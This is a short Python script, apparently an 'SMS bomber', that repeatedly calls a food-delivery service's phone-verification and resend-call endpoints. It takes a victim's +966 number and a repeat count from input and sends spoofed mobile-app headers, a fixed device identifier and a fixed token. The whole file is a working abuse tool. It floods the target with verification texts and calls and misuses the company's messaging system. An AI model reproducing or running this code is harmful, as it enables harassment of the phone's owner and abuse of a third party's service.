import os, sys, json, requests, time

class Bala:
	def __init__(self):
		self.u="https://hungerstation.com/api/v2/verification/register"
		self.h="https://hungerstation.com/api/v2/verification/resend_call"
		self.unum()

	def unum(self):
		nom=input("spam snap chatt number   :  ")
		jum=int(input("JUST NUMBER   : "))
		for i in range(jum):
			res=self.send(nom)
			if 'message' in res:
				print(f"{i+1}. Good Send ")
			else:
				print(f"{i+1}. Failed\n")
			time.sleep(1)

	def send(self,nom):
		ata={"device_type":"2","device_uid":"834AF4E6-38BB-4C0D-BB2C-4A485732E114","mobile":"+966"+nom,"notification_token":"7556A0AF434E0EB43634004B7648868CD515F18B4365813659D1D46C0C54529B"}
		head={
		'Host':'hungerstation.com',
		'ADJUST-ID': '4ffb0ee842da660ea140dae0771e7e26',
        'DEVICE-UID': '834AF4E6-38BB-4C0D-BB2C-4A485732E114',
        'Accept': '*/*',
        'App-Version': '534',
        'Authorization':'' ,
        'Accept-Language': 'ar',
        'Accept-Encoding': 'gzip, deflate',
        'If-None-Match': 'W/"ca6ba006f61f4e668aa8b275c12a9b0d"',
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        'Content-Length': '168',
        'User-Agent': 'HungerStation/534 iPhone/9,3 iOS/14.4.1 CFNetwork/1220.1 Darwin/20.3.0',
        'Connection': 'close',
        'Cookie': '__cfduid=d9bcc6ee3259e660f34b401b81e12938d1618087084',}
		
		req=requests.post(self.u,data=ata,headers=head)
		req=requests.post(self.h,data=ata,headers=head)
		return req.text

try:
	os.system('clear')
	print("""\033[1;37m
	# SmFlo #
	    ~ sms Hack Developer 0xfff0800
	    (Greetings to Hungerstation)
	""")
	Bala()

	while True:
		pil=input("Datwe Bardwam Be   (y/n)?")
		if pil.lower() == "y":
			print()
			Bala()
		else:
			sys.exit("Bzhy Taww   ")
except Exception as Err:
	print(f"Err: {Err}")